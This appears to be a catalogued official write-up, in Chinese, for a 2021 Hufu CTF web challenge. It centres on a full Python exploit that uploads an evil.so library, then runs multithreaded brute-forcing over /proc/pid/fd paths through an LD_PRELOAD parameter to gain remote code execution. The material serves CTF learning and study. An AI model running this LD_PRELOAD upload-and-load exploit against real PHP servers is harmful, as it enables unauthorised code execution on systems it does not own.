---
title: 第三届数字中国虎符网络安全赛道线上赛 官方Writeup
contest: 第三届数字中国虎符网络安全赛道线上赛
year: 2021
difficulty: hard
vuln_type: web_unknown
tags: [数字中国虎符, LD_PRELOAD, evil.so动态库, /proc/pid/fd/fd, RCE, 多线程爆破, official_writeup]
attack_chain: 上传evil.so→HTTP请求触发LD_PRELOAD=/proc/pid/fd/fd→多线程for pid/fd爆破→RCE
key_payload: "LD_PRELOAD=/proc/pid/fd/fd;Thread for pid 12-40 fd 1-40;evil.so动态库;HTTP/1.1 packet构造"
one_liner: 数字中国虎符线上赛官方WP：LD_PRELOAD+evil.so+/proc/pid/fd/fd多线程爆破RCE
lesson: 上传.so文件通过LD_PRELOAD环境变量RCE；/proc/pid/fd/枚举打开文件描述符
quality: high
---

# 第三届数字中国虎符网络安全赛道线上赛 官方Writeup

**赛事**：第三届数字中国虎符网络安全赛道线上赛（2021）

**性质**：官方Writeup

**核心payload**：
```python
from threading import Thread
import requests
import socket
import time

port = 8020
host = "ip"

def do_so():
    data = open("evil.so", "rb").read()
    packet = f"""POST /index.php HTTP/1.1\r\nHOST:{host}:{port}\r\nContent-Length:{len(data)+11}\r\n\r\n"""
    packet = packet.encode()
    packet += data
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(packet)
    time.sleep(10)
    s.close()

def ldload(pid, fd):
    sopath = f"/proc/{pid}/fd/{fd}"
    r = requests.get(f"http://{host}:{port}/index.php", 
                      params={"env": f"LD_PRELOAD={sopath}"})
    return r

# 多线程爆破
for pid in range(12, 40):
    for fd in range(1, 40):
        t = Thread(target=ldload, args=(pid, fd))
        t.start()
```

**攻击链**：
1. 上传 evil.so 动态库文件
2. HTTP请求触发 LD_PRELOAD=/proc/pid/fd/fd
3. 目标进程加载已上传的.so
4. .so 构造函数执行任意代码

**核心技术**：
- LD_PRELOAD环境变量劫持
- /proc/pid/fd/枚举打开的文件描述符
- 找到刚上传.so的fd
- 多线程爆破pid和fd组合
- evil.so动态库构造函数RCE

**质量评估**：高（官方Writeup + 完整利用代码）
